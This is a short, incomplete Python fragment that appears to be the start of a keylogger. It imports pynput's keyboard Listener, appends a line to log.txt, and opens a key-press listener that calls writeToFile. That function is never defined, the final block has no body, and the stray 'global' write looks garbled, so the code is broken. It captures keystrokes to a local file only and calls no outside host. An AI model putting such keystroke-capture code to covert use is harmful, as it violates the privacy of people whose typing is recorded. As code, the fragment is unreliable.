from pynput.keyboard import Listener

with open("log.txt", 'a') as f:
    f.write("global\n")

with Listener(on_press=writeToFile) as l: